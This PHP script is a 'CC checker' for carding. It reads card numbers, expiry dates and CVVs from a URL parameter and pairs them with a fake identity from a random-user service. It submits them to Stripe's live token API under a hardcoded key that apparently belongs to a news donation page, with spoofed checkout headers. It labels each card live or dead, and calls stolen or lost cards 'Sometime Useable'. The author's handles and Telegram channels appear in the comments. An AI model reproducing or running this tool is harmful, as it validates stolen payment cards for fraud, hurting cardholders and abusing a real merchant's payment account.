<?php

/// Made by 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁™】


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mon = multiexplode(array(":", "|", ""), $lista)[1];
$year = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":(.*),\")siU", $get, $matches1);
$country = $matches1[1][0];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-language: en-US',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html?distinct_id=00f76a7f-9db9-eccb-c832-00262238c3c1',
//// Referer is most important thing
////if api dead change referer
'sec-fetch-mode: cors',
'sec-fetch-site: same-site')); //// Always check sec
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2Fa44017d)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F81.0.4044.138+Safari%2F537.36&device_id=a62b35e4-6467-4852-a823-ca43e5e70509&referrer=https%3A%2F%2Fcheckout.fundjournalism.org%2Fmemberform%3Forg_id%3Dvtdigger&time_checkout_opened=1590378218&time_checkout_loaded=1590378190&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&card[name]='.$name.'+'.$last.'&time_on_page=51921&guid=NA&muid=f282a571-2ae1-4eee-9b57-07433c372c52&sid=753afa2b-6d6e-4725-8f66-3053b9dd97d2&key=pk_live_hFDBERkoASNgvjHQOMS7BMO9');
$result = curl_exec($ch);
if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CCN LIVE - Incorrect Zip | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Expired Card | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
 else {
  echo  '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined | Checker By ₮Ɇ₳₥_₳₦Ø₦Ɏ₥ØɄ₴ - Ӿ</span> </br>';
}
curl_close($ch);
ob_flush();
//echo $result 
////////////////////// 1req Checker Made By 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁™】
////////////////////// Join @ZeltraxRockz & @ZeltraxChat for more
?>
